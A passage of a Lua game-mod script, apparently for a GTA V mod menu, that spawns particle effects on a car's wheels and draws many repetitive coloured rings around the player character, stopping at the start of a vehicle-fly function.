	{"scr_rcbarry2", "scr_clown_appears", 0.3, 500},
	{"core", "ent_dst_elec_fire_sp", 1.0, 100},
	{"scr_rcbarry1", "scr_alien_disintegrate", 0.1, 400},
	{"scr_rcbarry1", "scr_alien_teleport", 0.1, 400}
}
local careffects_lastEffect = newTimer()

function cargoodeffect()
    local effects = careffects[selectedOpt]
	local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)

	if ENTITY.DOES_ENTITY_EXIST(vehicle) and not ENTITY.IS_ENTITY_DEAD(vehicle, false) and
	VEHICLE.IS_VEHICLE_DRIVEABLE(vehicle, false) and careffects_lastEffect.elapsed() > effects[4] then
		request_fx_asset(effects[1])
		for _, boneName in pairs({"wheel_lf", "wheel_lr", "wheel_rf", "wheel_rr"}) do
			local bone = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(vehicle, boneName)
			GRAPHICS.USE_PARTICLE_FX_ASSET(effects[1])
			WIRI_GRAPHICS.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY_BONE(
				effects[2],
				vehicle,
				-0.05, 0.0, 0.0,
				0.0, 0.0, 0.0,
				bone,
				effects[3],
				false, false, false
			)
		end
		careffects_lastEffect.reset()
	end
end

function set_carvis(index)
    selectedOpt = index
end

--封号斗罗
function kongzhihk(toggle)
    local radius = 0.3
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.97, c.x + x2, c.y + y2, c.z-0.95, 255, 255, 255, 255)
    end
    end
    
    function kongzhiha(toggle)
    local radius = 0.31
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.97, c.x + x2, c.y + y2, c.z-0.97, 255, 255, 255, 255)
    end
    end
    
    function kongzhihb(toggle)
    local radius = 0.32
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.97, c.x + x2, c.y + y2, c.z-0.97, 255, 255, 255, 255)
    end
    end
    
    function kongzhihc(toggle)
    local radius = 0.33
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.97, c.x + x2, c.y + y2, c.z-0.97, 255, 255, 255, 255)
    end
    end
    
    function kongzhihd(toggle)
    local radius = 0.34
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.97, c.x + x2, c.y + y2, c.z-0.97, 255, 255, 255, 255)
    end
    end
    
    function hunhuan(toggle)
    kongzhihk()
    kongzhiha()
    kongzhihb()
    kongzhihc()
    kongzhihd()
    end
    
    function kongzhikk(toggle)
    local radius = 0.5
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.95, c.x + x2, c.y + y2, c.z-0.95, 255, 255, 0, 255)
    end
    end
    
    function kongzhika(toggle)
    local radius = 0.51
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.95, c.x + x2, c.y + y2, c.z-0.95, 255, 255, 0, 255)
    end
    end
    
    function kongzhikb(toggle)
    local radius = 0.52
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.95, c.x + x2, c.y + y2, c.z-0.95, 255, 255, 0, 255)
    end
    end
    
    function kongzhikc(toggle)
    local radius = 0.53
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.95, c.x + x2, c.y + y2, c.z-0.95, 255, 255, 0, 255)
    end
    end
    
    function kongzhikd(toggle)
    local radius = 0.54
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.95, c.x + x2, c.y + y2, c.z-0.95, 255, 255, 0, 255)
    end
    end
    
    function hunhuan1(toggle)
    kongzhikk()
    kongzhika()
    kongzhikb()
    kongzhikc()
    kongzhikd()
    end
    
    function kongzhiak(toggle)
    local radius = 0.7
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.90, c.x + x2, c.y + y2, c.z-0.90, 150, 50, 200, 255)
    end
    end
    
    function kongzhiba(toggle)
    local radius = 0.71
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.90, c.x + x2, c.y + y2, c.z-0.90, 150, 50, 200, 255)
    end
    end
    
    function kongzhicb(toggle)
    local radius = 0.72
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.90, c.x + x2, c.y + y2, c.z-0.90, 150, 50, 200, 255)
    end
    end
    
    function kongzhidc(toggle)
    local radius = 0.73
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.90, c.x + x2, c.y + y2, c.z-0.90, 150, 50, 200, 255)
    end
    end
    
    function kongzhied(toggle)
    local radius = 0.74
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.90, c.x + x2, c.y + y2, c.z-0.90, 150, 50, 200, 255)
    end
    end
    
    function hunhuan2(toggle)
    kongzhiak()
    kongzhiba()
    kongzhicb()
    kongzhidc()
    kongzhied()
    end
    
    function kongzhiaa(toggle)
    local radius = 0.9
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.8, c.x + x2, c.y + y2, c.z-0.8, 0, 0, 0, 255)
    end
    end
    
    function kongzhibb(toggle)
    local radius = 0.91
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.8, c.x + x2, c.y + y2, c.z-0.8, 0, 0, 0, 255)
    end
    end
    
    function kongzhicc(toggle)
    local radius = 0.92
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.8, c.x + x2, c.y + y2, c.z-0.8, 0, 0, 0, 255)
    end
    end
    
    function kongzhidd(toggle)
    local radius = 0.93
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.8, c.x + x2, c.y + y2, c.z-0.8, 0, 0, 0, 255)
    end
    end
    
    function kongzhiee(toggle)
    local radius = 0.94
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.8, c.x + x2, c.y + y2, c.z-0.8, 0, 0, 0, 255)
    end
    end
    
    function hunhuan3(toggle)
    kongzhiaa()
    kongzhibb()
    kongzhicc()
    kongzhidd()
    kongzhiee()
    end
    
    function honga(toggle)
    local radius = 1.2
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.7, c.x + x2, c.y + y2, c.z-0.7, 255, 0, 0, 255)
    end
    end
    
    function hongb(toggle)
    local radius = 1.21
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.7, c.x + x2, c.y + y2, c.z-0.7, 255, 0, 0, 255)
    end
    end
    
    function hongc(toggle)
    local radius = 1.22
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.7, c.x + x2, c.y + y2, c.z-0.7, 255, 0, 0, 255)
    end
    end
    
    function hongd(toggle)
    local radius = 1.23
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.7, c.x + x2, c.y + y2, c.z-0.7, 255, 0, 0, 255)
    end
    end
    
    function honge(toggle)
    local radius = 1.24
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.7, c.x + x2, c.y + y2, c.z-0.7, 255, 0, 0, 255)
    end
    end
    
    function hunhuan4(toggle)
    honga()
    hongb()
    hongc()
    hongd()
    honge()
    end
    
    function hongaa(toggle)
    local radius = 1.5
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.5, c.x + x2, c.y + y2, c.z-0.5, 255, 0, 0, 255)
    end
    end
    
    function hongbb(toggle)
    local radius = 1.51
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.5, c.x + x2, c.y + y2, c.z-0.5, 255, 0, 0, 255)
    end
    end
    
    function hongcc(toggle)
    local radius = 1.52
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.5, c.x + x2, c.y + y2, c.z-0.5, 255, 0, 0, 255)
    end
    end
    
    function hongdd(toggle)
    local radius = 1.53
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.5, c.x + x2, c.y + y2, c.z-0.5, 255, 0, 0, 255)
    end
    end
    
    function hongee(toggle)
    local radius = 1.54
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.5, c.x + x2, c.y + y2, c.z-0.5, 255, 0, 0, 255)
    end
    end
    
    function hunhuan5(toggle)
    hongaa()
    hongbb()
    hongcc()
    hongdd()
    hongee()
    end
    
    function hongaaa(toggle)
    local radius = 1.7
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.3, c.x + x2, c.y + y2, c.z-0.3, 255, 0, 0, 255)
    end
    end
    
    function hongbbb(toggle)
    local radius = 1.71
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.3, c.x + x2, c.y + y2, c.z-0.3, 255, 0, 0, 255)
    end
    end
    
    function hongccc(toggle)
    local radius = 1.72
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.3, c.x + x2, c.y + y2, c.z-0.3, 255, 0, 0, 255)
    end
    end
    
    function hongddd(toggle)
    local radius = 1.73
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.3, c.x + x2, c.y + y2, c.z-0.3, 255, 0, 0, 255)
    end
    end
    
    function hongeee(toggle)
    local radius = 1.74
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.3, c.x + x2, c.y + y2, c.z-0.3, 255, 0, 0, 255)
    end
    end
    
    function hunhuan6(toggle)
    hongaaa()
    hongbbb()
    hongccc()
    hongddd()
    hongeee()
    end
    
    function hongaaaa(toggle)
    local radius = 1.9
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.1, c.x + x2, c.y + y2, c.z-0.1, 255, 0, 0, 255)
    end
    end
    
    function hongbbbb(toggle)
    local radius = 1.91
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.1, c.x + x2, c.y + y2, c.z-0.1, 255, 0, 0, 255)
    end
    end
    
    function hongcccc(toggle)
    local radius = 1.92
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.1, c.x + x2, c.y + y2, c.z-0.1, 255, 0, 0, 255)
    end
    end
    
    function hongdddd(toggle)
    local radius = 1.93
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.1, c.x + x2, c.y + y2, c.z-0.1, 255, 0, 0, 255)
    end
    end
    
    function hongeeee(toggle)
    local radius = 1.94
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z-0.1, c.x + x2, c.y + y2, c.z-0.1, 255, 0, 0, 255)
    end
    end
    
    function hunhuan7(toggle)
    hongaaaa()
    hongbbbb()
    hongcccc()
    hongdddd()
    hongeeee()
    end
    
    function hongaaaaa(toggle)
    local radius = 2.2
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z+0.1, c.x + x2, c.y + y2, c.z+0.1, 255, 0, 0, 255)
    end
    end
    
    function hongbbbbb(toggle)
    local radius = 2.21
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z+0.1, c.x + x2, c.y + y2, c.z+0.1, 255, 0, 0, 255)
    end
    end
    
    function hongccccc(toggle)
    local radius = 2.22
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z+0.1, c.x + x2, c.y + y2, c.z+0.1, 255, 0, 0, 255)
    end
    end
    
    function hongddddd(toggle)
    local radius = 2.23
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z+0.1, c.x + x2, c.y + y2, c.z+0.1, 255, 0, 0, 255)
    end
    end
    
    function hongeeeee(toggle)
    local radius = 2.24
    local numSegments = 100 
    local segmentAngle = 360 / numSegments 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i-1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z+0.1, c.x + x2, c.y + y2, c.z+0.1, 255, 0, 0, 255)
    end
    end
    
function hunhuan8(toggle)
hongaaaaa()
hongbbbbb()
hongccccc()
hongddddd()
hongeeeee()
end
--FUCK YOU
speed = 6
function do_vehicle_fly() 
    veh = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
    cam_pos = CAM.GET_GAMEPLAY_CAM_ROT(0);
